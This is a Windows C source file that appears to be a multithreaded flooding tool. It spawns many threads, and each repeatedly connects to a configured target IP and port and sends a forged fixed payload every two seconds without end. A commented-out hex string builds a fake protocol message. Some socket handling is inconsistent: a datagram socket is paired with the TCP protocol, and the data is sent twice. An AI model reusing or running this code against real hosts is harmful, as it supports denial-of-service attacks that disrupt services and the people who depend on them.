#include "ForgeHttp.h"
#include "ForgePort.h"

PFORGE_PORT_ATTACH_PARAMTER g_pForgePortParamter;
HANDLE g_hAttachPortThread[MAXIMUM_ATTACH_THREAD] = {0};
ULONG g_ulPortThreadId[MAXIMUM_ATTACH_THREAD] = {0};
ULONG g_PortSocketCount = 0;

void MakeAttachCode(PCHAR pAttachDatA)
{
	//PCHAR pSubMagic;
	ULONG ulRdmSum;
	//CHAR Format[MAX_PATH];

	//RtlZeroMemory(Format,sizeof(CHAR) * MAX_PATH);
	//pSubMagic = strstr(pAttachDatA,"");
	//if (pSubMagic)
	//{

	//}
	//srand(0x7FFFFFFF);
	//srand((unsigned)time(0));
	//ulRdmSum = rand();
	//StringCchPrintfA(pAttachDatA, \
	//	MAX_PATH, \
	//	"#011010000001000000203030314B4246703730305556664A3173316F70373039634A7037304B4246%08x5DC000000007616E64726F6964", \
	//	ulRdmSum);
	RtlCopyMemory(pAttachDatA,ATTACH_SERVER_DATA,strlen(ATTACH_SERVER_DATA));
}
BOOLEAN ForgePortAttach(PCHAR pAttachIpAddr,USHORT uAttachPort,PCHAR pAttachData)
{
	SOCKET ConnectSocket;
	struct sockaddr_in ServerSocket;
	struct protoent *ppe;
	PCHAR pRecvBuf;
	CHAR RecvDat[1];
	int nRet;
	BOOLEAN bIsRecv;
	WSADATA wsaData;

	pRecvBuf = NULL;
	bIsRecv = TRUE;

	nRet = WSAStartup(MAKEWORD(2,2),&wsaData);
	if (nRet != NO_ERROR)
	{
#ifdef _DEBUG
		printf("WSAStartup failed with error: %d\n",nRet);
#endif
		return 0;
	}

	RtlZeroMemory(&ServerSocket,sizeof(struct sockaddr_in));
	ServerSocket.sin_family = AF_INET;
	ServerSocket.sin_port = htons(uAttachPort);
	ServerSocket.sin_addr.S_un.S_addr = inet_addr(pAttachIpAddr);
	MakeAttachCode(pAttachData);
#ifdef _DEBUG
	printf("%s\n",pAttachData);
#endif
	ppe = getprotobyname("tcp");
	//ppe = getprotobyname("udp");
	ConnectSocket = socket(AF_INET,SOCK_DGRAM,ppe->p_proto);       
	nRet = connect(ConnectSocket,(struct sockaddr *)&ServerSocket,sizeof(ServerSocket));
	if(nRet < 0)
	{
#ifdef _DEBUG
		printf("connect error!!! flag = %d\n",nRet);
#endif
		WSACleanup();
		return FALSE;
	}
	nRet = strlen(pAttachData);
	sendto(ConnectSocket,pAttachData,nRet,0,(struct sockaddr *)&ServerSocket,sizeof(SOCKADDR)); 
	nRet = send(ConnectSocket,pAttachData,strlen(pAttachData),0);
	if (nRet == SOCKET_ERROR)
	{
#ifdef _DEBUG
		printf("send() failed with error: %d\n",WSAGetLastError());
#endif
		closesocket(ConnectSocket);
		WSACleanup();
		return FALSE;
	}
#ifdef _DEBUG
	printf("Bytes Sent: %d\n",nRet);
#endif
	//do
	//{
		if (bIsRecv)
		{
			do 
			{
				pRecvBuf = VirtualAlloc(NULL, \
					PAGE_SIZE, \
					MEM_COMMIT | MEM_RESERVE, \
					PAGE_READWRITE);
			} while (NULL == pRecvBuf);
			RtlZeroMemory(pRecvBuf,PAGE_SIZE);
			nRet = recv(ConnectSocket,pRecvBuf,PAGE_SIZE,0);
			if (pRecvBuf)
			{
				VirtualFree(pRecvBuf,0,MEM_RELEASE);
			}
		}
		else
		{
			nRet = recv(ConnectSocket,RecvDat,1,0);
			//break;
		}
		if (nRet > 0)
		{
#ifdef _DEBUG
			printf("Bytes received: %d\n",nRet);
#endif
		}
	//} while(nRet > 0);
	closesocket(ConnectSocket);
	return TRUE;
}
DWORD WINAPI ForgeAttachPortThread(PVOID pParameter)
{
	PFORGE_PORT_ATTACH_PARAMTER pForgeHttpParamter;

	pForgeHttpParamter = (PFORGE_PORT_ATTACH_PARAMTER)pParameter;

	while (TRUE)
	{
		ForgePortAttach(pForgeHttpParamter->AttachIpAddrA, \
			pForgeHttpParamter->uAttachPort, \
			pForgeHttpParamter->AttachDatA);
		InterlockedIncrement(&g_PortSocketCount);
		printf("Socket Count: %08x\n",g_PortSocketCount);
		Sleep(2000);
	}
	return 0;
}
void InitializeAttachPortRoutine()
{
	ULONG uli;

	do 
	{
		g_pForgePortParamter = VirtualAlloc(NULL, \
			sizeof(FORGE_PORT_ATTACH_PARAMTER), \
			MEM_COMMIT | MEM_RESERVE, \
			PAGE_READWRITE);
	} while (NULL == g_pForgePortParamter);
	RtlZeroMemory(g_pForgePortParamter,sizeof(FORGE_PORT_ATTACH_PARAMTER));

	RtlCopyMemory(g_pForgePortParamter->AttachIpAddrA, \
		ATTACH_SERVER_IP_ADDRESS, \
		strlen(ATTACH_SERVER_IP_ADDRESS));

	RtlCopyMemory(g_pForgePortParamter->AttachDatA, \
		ATTACH_SERVER_DATA, \
		strlen(ATTACH_SERVER_DATA));
	g_pForgePortParamter->uAttachPort = ATTACH_PORT_PORT;

#ifdef _DEBUG
	for (uli = 0;uli < 1;uli++)
	{
		g_hAttachPortThread[uli] = CreateThread(NULL,0,ForgeAttachPortThread,g_pForgePortParamter,0,&g_ulPortThreadId[uli]);
	}
	WaitForSingleObject(g_hAttachPortThread[0],INFINITE);
#else
	for (uli = 0;uli < MAXIMUM_ATTACH_THREAD;uli++)
	{
		g_hAttachPortThread[uli] = CreateThread(NULL,0,ForgeAttachPortThread,g_pForgePortParamter,0,&g_ulPortThreadId[uli]);
		printf("Thread Count : %d\n",uli);
	}
	WaitForMultipleObjects(MAXIMUM_ATTACH_THREAD,g_hAttachPortThread,TRUE,INFINITE);
#endif
	return;
}
